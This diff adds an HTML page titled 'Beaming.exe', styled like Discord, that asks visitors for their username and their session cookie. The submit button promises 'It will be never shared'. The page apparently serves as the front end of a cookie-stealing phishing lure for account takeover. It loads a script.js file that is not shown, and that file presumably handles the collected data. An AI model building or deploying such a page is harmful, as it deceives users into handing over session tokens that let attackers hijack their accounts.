@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Beaming.exe</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #2b2d31; /* dark mode */
+        color: #ffffff;
+        padding: 20px;
+    }
+    #box {
+        max-width: 450px;
+        margin: 40px auto;
+        padding: 20px;
+        border-radius: 10px;
+        background: #1e1f22; /* Discord dark */
+        box-shadow: 0 0 10px #0005;
+    }
+    h2 {
+        text-align: center;
+        color: #ffffff;
+        margin-bottom: 20px;
+    }
+    .label {
+        margin-bottom: 5px;
+        font-size: 14px;
+        color: #b5b7bb;
+    }
+    input {
+        width: 100%;
+        height: 35px;
+        padding: 8px;
+        font-size: 14px;
+        margin-bottom: 15px;
+        border: none;
+        border-radius: 5px;
+        background: #313338;
+        color: #ffffff;
+        outline: none;
+    }
+    textarea {
+        width: 100%;
+        height: 80px;
+        padding: 10px;
+        font-size: 14px;
+        margin-bottom: 15px;
+        resize: none;
+        border: none;
+        border-radius: 5px;
+        background: #313338;
+        color: #ffffff;
+        outline: none;
+    }
+    button {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        cursor: pointer;
+        background: #5865F2;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-weight: bold;
+    }
+    button:hover {
+        background: #4752c4;
+    }
+</style>
+</head>
+<body>
+
+<div id="box">
+    <h2>Beaming.exe</h2>
+
+    <div class="label">Username</div>
+    <input id="username" placeholder="Enter username">
+
+    <div class="label">Your Cookie</div>
+    <textarea id="msg" placeholder="Enter your Cookie"></textarea>
+
+    <button id="sendBtn">Submit(It will be never shared)</button>
+</div>
+
+</body>
+
+<script src="script.js">
+    
+</script>
+
+</html>
